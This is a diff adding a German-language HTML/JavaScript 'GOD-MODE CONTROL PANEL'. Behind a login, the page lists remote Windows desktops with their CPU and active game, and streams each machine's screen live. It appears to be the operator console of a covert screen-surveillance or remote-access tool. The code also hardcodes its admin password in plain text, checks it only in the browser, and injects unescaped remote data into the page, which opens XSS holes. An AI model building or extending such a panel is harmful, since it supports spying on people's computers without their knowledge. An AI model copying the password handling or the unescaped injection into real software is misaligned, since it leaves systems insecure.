@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ASSMAR00 // GOD-MODE CONTROL PANEL</title>
+    <style>
+        :root {
+            --accent-color: #8a2be2;
+            --accent-hover: #9d3bf0;
+            --accent-glow: rgba(138, 43, 226, 0.3);
+            --bg-gradient: radial-gradient(circle at 50% 0%, #0d0b18 0%, #040407 100%);
+            --card-bg: #090812;
+            --card-border: #171429;
+            --input-bg: #110f1d;
+            --input-border: #221d3a;
+            --text-main: #e2e2ee;
+            --text-muted: #777799;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
+        body { background: var(--bg-gradient); color: var(--text-main); height: 100vh; overflow: hidden; }
+
+        #login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(4, 4, 7, 0.96); display: flex; justify-content: center; align-items: center; z-index: 9999;
+        }
+        .login-card { background: var(--card-bg); border: 1px solid var(--accent-color); border-radius: 14px; padding: 40px; width: 360px; text-align: center; }
+        .login-card h2 { font-size: 22px; font-weight: 800; margin-bottom: 6px; color: var(--accent-color); }
+        .login-card input { width: 100%; background: var(--input-bg); border: 1px solid var(--input-border); color: var(--accent-color); padding: 12px; border-radius: 8px; margin-bottom: 15px; outline: none; text-align: center; }
+        .login-card button { width: 100%; background: var(--accent-color); color: #fff; border: none; padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; }
+
+        #app-container { display: none; height: 100vh; display: flex; }
+        sidebar { width: 280px; background: rgba(7, 6, 12, 0.85); border-right: 1px solid var(--card-border); display: flex; flex-direction: column; padding: 22px 16px; }
+        .logo { font-size: 18px; font-weight: 900; margin-bottom: 25px; color: var(--accent-color); letter-spacing: 2px; }
+        .nav-btn { background: transparent; border: 1px solid transparent; color: #777799; text-align: left; padding: 10px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; margin-bottom: 4px; width: 100%; }
+        .nav-btn:hover, .nav-btn.active { background: var(--input-bg); color: var(--accent-color); border-color: var(--input-border); }
+
+        main { flex: 1; padding: 30px; overflow-y: auto; }
+        .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
+        .card h2 { font-size: 12px; color: var(--text-muted); margin-bottom: 14px; text-transform: uppercase; border-bottom: 1px solid var(--card-border); padding-bottom: 8px; }
+
+        table { width: 100%; border-collapse: collapse; margin-top: 5px; }
+        th, td { text-align: left; padding: 10px; border-bottom: 1px solid var(--card-border); font-size: 11px; }
+        th { color: #666688; text-transform: uppercase; font-size: 9px; }
+        td { color: #aaaacc; font-family: monospace; }
+        tr.user-row { cursor: pointer; }
+        tr.user-row:hover { background: var(--input-bg); }
+
+        /* MODAL */
+        #user-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(2, 2, 5, 0.9); display: none; justify-content: center; align-items: center; z-index: 10000;
+        }
+        .modal-card { background: var(--card-bg); border: 1px solid var(--accent-color); border-radius: 14px; width: 900px; max-height: 95vh; overflow-y: auto; padding: 25px; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--card-border); padding-bottom: 12px; margin-bottom: 18px; }
+        .modal-title { font-size: 16px; font-weight: bold; color: var(--accent-color); font-family: monospace; }
+        .close-modal { cursor: pointer; font-size: 18px; color: #ff5555; font-weight: bold; }
+
+        .modal-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
+        .modal-tab-btn { background: var(--input-bg); border: 1px solid var(--input-border); color: var(--text-muted); padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 11px; font-weight: bold; }
+        .modal-tab-btn.active { background: var(--accent-color); color: #fff; border-color: var(--accent-color); }
+        .modal-tab-pane { display: none; }
+        .modal-tab-pane.active { display: block; }
+
+        /* STREAM STEUERUNG */
+        .stream-controls { display: flex; gap: 10px; align-items: center; margin-bottom: 12px; background: var(--input-bg); padding: 10px; border-radius: 8px; border: 1px solid var(--input-border); }
+        .stream-controls select, .stream-controls button { margin-bottom: 0; padding: 6px 12px; font-size: 11px; }
+        .screen-stream-box { background: #020204; border: 1px solid var(--accent-color); border-radius: 8px; height: 420px; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; overflow: hidden; }
+    </style>
+</head>
+<body>
+
+    <!-- LOGIN -->
+    <div id="login-overlay">
+        <div class="login-card">
+            <h2>ASSMAR00</h2>
+            <p style="font-size: 11px; color: #666; margin-bottom: 20px;">Eingeschränkter Admin-Zugriff</p>
+            <input type="password" id="pass-input" placeholder="Passwort eingeben...">
+            <button onclick="checkLogin()">Zugriff Gewähren</button>
+            <div id="login-error" style="color:#ff4455; font-size:11px; margin-top:10px;"></div>
+        </div>
+    </div>
+
+    <!-- MODAL -->
+    <div id="user-modal">
+        <div class="modal-card" id="modal-box-container">
+            <div class="modal-header">
+                <div class="modal-title" id="m-user-title">SYSTEM INSPECTOR</div>
+                <div class="close-modal" onclick="closeUserModal()">✕</div>
+            </div>
+
+            <div class="modal-tabs">
+                <button class="modal-tab-btn active" onclick="switchModalTab('info', this)">💻 System Info</button>
+                <button class="modal-tab-btn" onclick="switchModalTab('stream', this)">🔴 Live Screen View</button>
+            </div>
+
+            <div id="modal-tab-info" class="modal-tab-pane active">
+                <p id="m-cpu" style="font-family:monospace; color:#aaa;">Lade System-Informationen...</p>
+            </div>
+
+            <div id="modal-tab-pane-stream" id="modal-tab-stream" class="modal-tab-pane">
+                <!-- Live Stream Steuerungsleiste -->
+                <div class="stream-controls">
+                    <label style="color:#fff; font-size:10px;">FPS:</label>
+                    <select id="stream-fps" onchange="updateStreamSettings()">
+                        <option value="10">10 FPS (Low)</option>
+                        <option value="15" selected>15 FPS (Standard)</option>
+                        <option value="30">30 FPS (High)</option>
+                    </select>
+
+                    <label style="color:#fff; font-size:10px; margin-left:10px;">AUFLÖSUNG:</label>
+                    <select id="stream-res" onchange="updateStreamSettings()">
+                        <option value="480p">480p (SD)</option>
+                        <option value="720p" selected>720p (HD)</option>
+                        <option value="1080p">1080p (Full HD)</option>
+                    </select>
+
+                    <button class="btn-secondary" onclick="toggleFullscreen()" style="margin-left:auto;">⛶ Vollbild</button>
+                </div>
+
+                <div class="screen-stream-box" id="stream-wrapper">
+                    <img id="live-video-feed" src="" alt="Stream wird geladen..." style="width: 100%; height: 100%; object-fit: contain;">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HAUPT PANEL -->
+    <div id="app-container">
+        <sidebar>
+            <div class="logo">ASSMAR00</div>
+            <button class="nav-btn active" onclick="switchTab('users', this)">👥 Desktop-Namen & Sessions</button>
+        </sidebar>
+        <main>
+            <div id="users" class="tab-content active">
+                <div class="card">
+                    <h2>Aktive Live-Sessions</h2>
+                    <table id="users-table">
+                        <thead>
+                            <tr>
+                                <th>Windows Desktop-Name</th>
+                                <th>CPU</th>
+                                <th>Game</th>
+                                <th>Aktion</th>
+                            </tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        const API_BASE = "http://127.0.0.1:8000";
+        let activeUserDesktop = "";
+
+        function checkLogin() {
+            if (document.getElementById('pass-input').value.trim() === "Assmar00.550662.-?") {
+                document.getElementById('login-overlay').style.display = 'none';
+                document.getElementById('app-container').style.display = 'flex';
+                fetchLiveData();
+                setInterval(fetchLiveData, 5000);
+            } else {
+                document.getElementById('login-error').innerText = "Falsches Passwort!";
+            }
+        }
+
+        function switchModalTab(tabName, btn) {
+            document.querySelectorAll('.modal-tab-pane').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.modal-tab-btn').forEach(el => el.classList.remove('active'));
+            document.getElementById('modal-tab-' + tabName).classList.add('active');
+            btn.classList.add('active');
+        }
+
+        function openUserModal(name, cpu, game) {
+            activeUserDesktop = name;
+            document.getElementById('m-user-title').innerText = "SYSTEM INSPECTOR // " + name;
+            document.getElementById('m-cpu').innerText = "Prozessor: " + cpu + " | Aktives Spiel: " + game;
+            
+            updateStreamSettings();
+            document.getElementById('user-modal').style.display = 'flex';
+        }
+
+        function updateStreamSettings() {
+            const fps = document.getElementById('stream-fps').value;
+            const res = document.getElementById('stream-res').value;
+            const imgElement = document.getElementById('live-video-feed');
+            imgElement.src = `${API_BASE}/video_feed?user=${activeUserDesktop}&fps=${fps}&res=${res}`;
+        }
+
+        function toggleFullscreen() {
+            const streamBox = document.getElementById('stream-wrapper');
+            if (!document.fullscreenElement) {
+                streamBox.requestFullscreen().catch(err => {
+                    alert("Fehler beim Vollbild: " + err.message);
+                });
+            } else {
+                document.exitFullscreen();
+            }
+        }
+
+        function closeUserModal() {
+            document.getElementById('user-modal').style.display = 'none';
+            document.getElementById('live-video-feed').src = "";
+        }
+
+        async function fetchLiveData() {
+            try {
+                let resUsers = await fetch(API_BASE + "/api/users");
+                let users = await resUsers.json();
+                let userTable = document.querySelector('#users-table tbody');
+                userTable.innerHTML = "";
+                users.forEach(u => {
+                    userTable.innerHTML += `
+                        <tr class="user-row" onclick="openUserModal('${u.desktop}', '${u.cpu}', '${u.game}')">
+                            <td>${u.desktop}</td>
+                            <td>${u.cpu}</td>
+                            <td>${u.game}</td>
+                            <td><button class="btn-secondary" style="padding: 3px 8px; font-size: 10px;">Inspect & Live</button></td>
+                        </tr>
+                    `;
+                });
+            } catch (e) {
+                console.error("Fehler beim Laden der Live-Daten", e);
+            }
+        }
+    </script>
+</body>
+</html>
